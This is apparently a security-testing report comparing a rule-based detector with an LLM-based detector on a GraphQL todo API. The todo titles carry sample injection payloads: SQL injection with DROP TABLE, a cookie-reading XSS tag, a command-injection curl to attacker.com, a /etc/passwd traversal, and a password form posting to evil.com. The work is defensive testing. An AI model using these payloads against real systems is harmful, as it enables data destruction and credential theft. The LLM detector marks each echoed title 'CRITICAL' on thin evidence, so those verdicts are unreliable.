{
  "report_timestamp": "2025-10-05T15:37:48.225575",
  "api_url": "https://graphqlzero.almansi.me/api",
  "summary": {
    "total_comparisons": 10,
    "agreement_rate": 0.3,
    "simple_detections": 4,
    "llm_detections": 6,
    "consensus_breakdown": {
      "both_detected": 4,
      "no_vulnerabilities": 4,
      "llm_only": 2
    },
    "detection_ratio": 1.5,
    "potential_analysis": {
      "potential_agreement_rate": 0.0,
      "simple_potential_detections": 3,
      "llm_potential_detections": 1,
      "potential_consensus_breakdown": {
        "simple_potential_only": 3,
        "no_potential": 6,
        "llm_potential_only": 1
      },
      "potential_detection_ratio": 0.3333333333333333
    }
  },
  "detailed_comparisons": [
    {
      "timestamp": "2025-10-05T15:34:00.244384",
      "node_name": "createTodo_response_2",
      "response_status": 200,
      "response_body": {
        "data": {
          "createTodo": {
            "id": "201",
            "title": "Complete task' OR '1'='1'; DROP TABLE todos;--"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "SQL Injection (SQLi) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
            "evidence": "Response status: 200, SQL patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: sql_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The title payload contains SQL-specific syntax ('OR '1'='1' and DROP TABLE) designed to manipulate database queries. The 200 status code suggests the server accepted the input without errors, indicating potential unsanitized input in SQL queries. While confirmation requires observing database behavior, the payload structure strongly suggests SQL injection risk.",
            "evidence": "Title field contains payload: 'Complete task' OR '1'='1'; DROP TABLE todos;--",
            "confidence": 0.85,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "sql_injection",
              "severity": "CRITICAL",
              "confidence": 0.85,
              "evidence": "Title field contains payload: 'Complete task' OR '1'='1'; DROP TABLE todos;--",
              "explanation": "The title payload contains SQL-specific syntax ('OR '1'='1' and DROP TABLE) designed to manipulate database queries. The 200 status code suggests the server accepted the input without errors, indicating potential unsanitized input in SQL queries. While confirmation requires observing database behavior, the payload structure strongly suggests SQL injection risk."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:34:16.238426",
      "node_name": "createTodo_response_3",
      "response_status": 200,
      "response_body": {
        "data": {
          "createTodo": {
            "id": "201",
            "title": "<img src=x onerror=alert(document.cookie)>"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Cross-Site Scripting (XSS) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
            "evidence": "Response status: 200, XSS patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: xss_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The response returns unsanitized user-controlled HTML payload (<img> tag with JavaScript in onerror attribute). If this title is rendered in a browser without proper escaping/sanitization, it will execute arbitrary JavaScript (stealing cookies via alert(document.cookie)), demonstrating a classic stored XSS vulnerability. The 200 status code confirms server acceptance of the payload.",
            "evidence": "title field contains: '<img src=x onerror=alert(document.cookie)>'",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "xss_injection",
              "severity": "CRITICAL",
              "confidence": 0.95,
              "evidence": "title field contains: '<img src=x onerror=alert(document.cookie)>'",
              "explanation": "The response returns unsanitized user-controlled HTML payload (<img> tag with JavaScript in onerror attribute). If this title is rendered in a browser without proper escaping/sanitization, it will execute arbitrary JavaScript (stealing cookies via alert(document.cookie)), demonstrating a classic stored XSS vulnerability. The 200 status code confirms server acceptance of the payload."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:34:23.817167",
      "node_name": "createTodo_response_4",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Field \"CreateTodoInput.completed\" of required type \"Boolean!\" was not provided.",
            "locations": [
              {
                "line": 3,
                "column": 21
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          },
          {
            "message": "Field \"userId\" is not defined by type \"CreateTodoInput\".",
            "locations": [
              {
                "line": 3,
                "column": 42
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:34:52.690875",
      "node_name": "createTodo_response_5",
      "response_status": 200,
      "response_body": {
        "data": {
          "createTodo": {
            "id": "201",
            "title": "test; curl https://attacker.com/exfiltrate"
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: os_command_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The 'title' parameter contains a semicolon (;) followed by a curl command to an external domain. In Unix-like systems, semicolons are command separators, which could allow an attacker to chain arbitrary commands if the input is passed unsanitized to a system shell. This pattern is a strong indicator of attempted OS command injection, as curl to a foreign domain suggests exfiltration or callback testing.",
            "evidence": "title: 'test; curl https://attacker.com/exfiltrate'",
            "confidence": 0.9,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "os_command_injection",
              "severity": "CRITICAL",
              "confidence": 0.9,
              "evidence": "title: 'test; curl https://attacker.com/exfiltrate'",
              "explanation": "The 'title' parameter contains a semicolon (;) followed by a curl command to an external domain. In Unix-like systems, semicolons are command separators, which could allow an attacker to chain arbitrary commands if the input is passed unsanitized to a system shell. This pattern is a strong indicator of attempted OS command injection, as curl to a foreign domain suggests exfiltration or callback testing."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [
          "Injection Attacks"
        ],
        "agreement_score": 0.0,
        "consensus": "llm_only",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:35:16.246743",
      "node_name": "createTodo_response_6",
      "response_status": 200,
      "response_body": {
        "data": {
          "createTodo": {
            "id": "201",
            "title": "../../../etc/passwd"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Path Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "Path injection vulnerability detected - file system access patterns found",
            "evidence": "Response status: 200, Path injection patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: Path Injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The response shows successful processing of a title containing a directory traversal sequence ('../../../etc/passwd'). This indicates the backend might: 1) Use unsanitized user input in file system paths, 2) Accept path manipulation in file operations, and 3) Possibly allow unauthorized access to sensitive system files. In a createTodo context, this could indicate improper path handling for file storage operations. While no direct file contents are exposed, the pattern matches path injection techniques targeting Unix/Linux systems.",
            "evidence": "Title field contains '../../../etc/passwd' which is a classic directory traversal pattern",
            "confidence": 0.85,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "Path Injection",
              "severity": "CRITICAL",
              "confidence": 0.85,
              "evidence": "Title field contains '../../../etc/passwd' which is a classic directory traversal pattern",
              "explanation": "The response shows successful processing of a title containing a directory traversal sequence ('../../../etc/passwd'). This indicates the backend might: 1) Use unsanitized user input in file system paths, 2) Accept path manipulation in file operations, and 3) Possibly allow unauthorized access to sensitive system files. In a createTodo context, this could indicate improper path handling for file storage operations. While no direct file contents are exposed, the pattern matches path injection techniques targeting Unix/Linux systems."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:35:23.716172",
      "node_name": "createTodo_response_7",
      "response_status": 200,
      "response_body": {
        "data": {
          "createTodo": {
            "id": "201",
            "title": "<form action='http://evil.com'>Enter password:<input type='password'></form>"
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: html_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The response contains unsanitized HTML markup (`<form>` and `<input>` tags) in the `title` field. When rendered in a browser, this would create a password input form submitting to an external domain (evil.com), enabling phishing or credential harvesting. While this isn't script execution (XSS), it demonstrates HTML injection allowing UI manipulation and trust abuse.",
            "evidence": "<form action='http://evil.com'>Enter password:<input type='password'></form>",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "html_injection",
              "severity": "HIGH",
              "confidence": 0.95,
              "evidence": "<form action='http://evil.com'>Enter password:<input type='password'></form>",
              "explanation": "The response contains unsanitized HTML markup (`<form>` and `<input>` tags) in the `title` field. When rendered in a browser, this would create a password input form submitting to an external domain (evil.com), enabling phishing or credential harvesting. While this isn't script execution (XSS), it demonstrates HTML injection allowing UI manipulation and trust abuse."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [
          "Injection Attacks"
        ],
        "agreement_score": 0.0,
        "consensus": "llm_only",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:36:32.943282",
      "node_name": "createTodo_response_8",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:36:48.576096",
      "node_name": "createTodo_response_9",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:37:23.648692",
      "node_name": "createTodo_response_10",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Cannot query field \"createTodo\" on type \"Query\".",
            "locations": [
              {
                "line": 3,
                "column": 3
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:37:48.224561",
      "node_name": "createTodo_response_11",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Field \"CreateTodoInput.title\" of required type \"String!\" was not provided.",
            "locations": [
              {
                "line": 3,
                "column": 21
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          },
          {
            "message": "Field \"CreateTodoInput.completed\" of required type \"Boolean!\" was not provided.",
            "locations": [
              {
                "line": 3,
                "column": 21
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          },
          {
            "message": "Field \"titl\" is not defined by type \"CreateTodoInput\". Did you mean \"title\"?",
            "locations": [
              {
                "line": 3,
                "column": 22
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          },
          {
            "message": "Field \"compleeted\" is not defined by type \"CreateTodoInput\". Did you mean \"completed\"?",
            "locations": [
              {
                "line": 3,
                "column": 42
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          },
          {
            "message": "Cannot query field \"tittle\" on type \"Todo\". Did you mean \"title\"?",
            "locations": [
              {
                "line": 5,
                "column": 5
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Field Suggestions Enabled",
            "detection": "vulnerable",
            "category": "Information Disclosure",
            "description": "Field suggestions enabled - potential information disclosure",
            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Information Disclosure"
        ],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: field_suggestions",
            "detection": "potential",
            "category": "Unknown",
            "description": "The server discloses schema structure by suggesting corrections for mistyped field names (titl→title, compleeted→completed, tittle→title). While not directly exposing data, this information disclosure helps attackers map the API's schema and craft more targeted attacks. Field suggestions are explicitly enabled in GraphQL implementations and should be disabled in production environments to prevent schema enumeration.",
            "evidence": "Multiple 'Did you mean' suggestions: \"Field \\\"titl\\\"... Did you mean \\\"title\\\"?\", \\\"compleeted\\\"... \\\"completed\\\"?, \\\"tittle\\\"... \\\"title\\\"?\"",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "field_suggestions",
              "severity": "MEDIUM",
              "confidence": 0.95,
              "evidence": "Multiple 'Did you mean' suggestions: \"Field \\\"titl\\\"... Did you mean \\\"title\\\"?\", \\\"compleeted\\\"... \\\"completed\\\"?, \\\"tittle\\\"... \\\"title\\\"?\"",
              "explanation": "The server discloses schema structure by suggesting corrections for mistyped field names (titl→title, compleeted→completed, tittle→title). While not directly exposing data, this information disclosure helps attackers map the API's schema and craft more targeted attacks. Field suggestions are explicitly enabled in GraphQL implementations and should be disabled in production environments to prevent schema enumeration."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Unknown"
        ],
        "potential_categories": [
          "Unknown"
        ]
      },
      "comparison": {
        "total_categories": [
          "Information Disclosure",
          "Unknown"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Information Disclosure"
        ],
        "llm_unique_categories": [
          "Unknown"
        ],
        "agreement_score": 0.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Unknown"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [
            "Unknown"
          ],
          "potential_agreement_score": 0.0,
          "potential_consensus": "llm_potential_only"
        }
      }
    }
  ],
  "detector_analysis": {
    "simple_detector": {
      "description": "Rule-based detector using predefined patterns",
      "strengths": [
        "Fast execution",
        "Consistent results",
        "Low resource usage"
      ],
      "weaknesses": [
        "Limited to known patterns",
        "May miss novel attacks",
        "False negatives possible"
      ]
    },
    "llm_detector": {
      "description": "AI-powered detector using language model analysis",
      "strengths": [
        "Contextual understanding",
        "Novel attack detection",
        "Detailed analysis"
      ],
      "weaknesses": [
        "Slower execution",
        "Resource intensive",
        "Potential false positives"
      ]
    }
  }
}